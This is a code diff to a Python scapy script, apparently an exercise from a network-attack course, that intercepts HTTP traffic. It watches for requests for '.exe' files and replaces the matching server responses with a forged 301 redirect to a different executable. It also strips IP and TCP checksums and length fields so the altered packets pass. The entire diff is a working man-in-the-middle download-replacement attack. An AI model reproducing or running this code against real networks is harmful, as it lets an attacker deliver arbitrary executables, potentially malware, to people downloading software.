@@ -6,7 +6,7 @@ ack_list = []
 
 def process_packet(packet) -> None:
     '''Accepts a packets and print it'''
-    # converting packets to scapy packets
+    # converting packet to scapy packets
     scapy_packet = scapy.IP(packet.get_payload())
     if scapy_packet.haslayer(scapy.Raw):
         # HTTP Request
@@ -14,14 +14,20 @@ def process_packet(packet) -> None:
             if ".exe" in scapy_packet[scapy.Raw].load:
                 print("[+] exe Request")
                 ack_list.append(scapy_packet[scapy.TCP].ack)    
-                print(scapy_packet.show())
         # HTTP Response
         elif scapy_packet[scapy.TCP].sport == 80:
             if scapy_packet[scapy.TCP].seq in ack_list:
                 ack_list.remove(scapy_packet[scapy.TCP].seq)
                 print("[+] Replacing file")
-                print(scapy_packet.show())
-
+                scapy_packet[scapy.Raw].load = "HTTP/1.1 301 Moved Permanently\nLocation: https://www.rarlab.com/rar/wrar56b1.exe\n\n"
+                
+                # deleting packets security details
+                del scapy_packet[scapy.IP].len
+                del scapy_packet[scapy.IP].chksum
+                del scapy_packet[scapy.TCP].chksum
+                # converting scapy packet to normal packet
+                packet.set_payload(str(scapy_packet))
+                
     packet.accept() # To accept packet and forward it to destination
     # packet.drop() # To accept packet and drop it
 
